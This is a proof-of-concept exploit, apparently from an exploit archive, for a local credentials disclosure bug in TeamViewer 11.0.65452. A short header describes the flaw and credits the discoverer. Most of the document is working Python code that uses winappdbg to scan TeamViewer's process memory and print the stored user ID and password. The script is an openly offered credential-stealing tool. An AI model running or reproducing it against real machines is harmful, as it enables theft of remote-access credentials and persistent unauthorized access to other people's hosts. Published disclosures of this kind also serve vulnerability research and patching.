#####
# TeamViewer 11.0.65452 (64 bit) Local Credentials Disclosure
# Tested on Windows 7 64bit, English
# Vendor Homepage @ https://www.teamviewer.com/
# Date 07/09/2016
# Bug Discovered by Alexander Korznikov (https://www.linkedin.com/in/nopernik)
#
# http://www.korznikov.com | @nopernik
#
# Special Thanks to:
#       Viktor Minin (https://www.exploit-db.com/author/?a=8052) | (https://1-33-7.com/)
#       Yakir Wizman (https://www.exploit-db.com/author/?a=1002) | (http://www.black-rose.ml)
#
#####
# TeamViewer 11.0.65452 is vulnerable to local credentials disclosure, the supplied userid and password are stored in a plaintext format in memory process.
# There is no need in privilege account access. Credentials are stored in context of regular user.
# A potential attacker could reveal the supplied username and password automaticaly and gain persistent access to host via TeamViewer services.
#
# Proof-Of-Concept Code:
#####

from winappdbg import Debug, Process, HexDump
import sys
import re

filename = 'TeamViewer.exe'

def memory_search( pid ):
        found = []
        # Instance a Process object.
        process = Process( pid )
        # Search for the string in the process memory.

        # Looking for User ID:
        userid_pattern = '([0-9]\x00){3} \x00([0-9]\x00){3} \x00([0-9]\x00){3}[^)]'
        for address in process.search_regexp( userid_pattern ):
                 found += [address]
        
        print 'Possible UserIDs found:'
        found = [i[-1] for i in found]
        for i in set(found):
           print i.replace('\x00','')
        
        found = []
        # Looking for Password:
        pass_pattern = '([0-9]\x00){4}\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00'
        for address in process.search_regexp( pass_pattern ):
                 found += [process.read(address[0]-3,16)]
        if found:
            print '\nPassword:'
        if len(found) > 1:
            s = list(set([x for x in found if found.count(x) > 1]))
            for i in s:
               pwd = re.findall('[0-9]{4}',i.replace('\x00',''))[0]
            print pwd
        else:
            print re.findall('[0-9]{4}',found[0].replace('\x00',''))[0]
        
        return found

debug = Debug()
try:
        # Lookup the currently running processes.
        debug.system.scan_processes()
        # For all processes that match the requested filename...
        for ( process, name ) in debug.system.find_processes_by_filename( filename ):
                pid = process.get_pid()

        memory_search(pid)
           
finally:
        debug.stop()


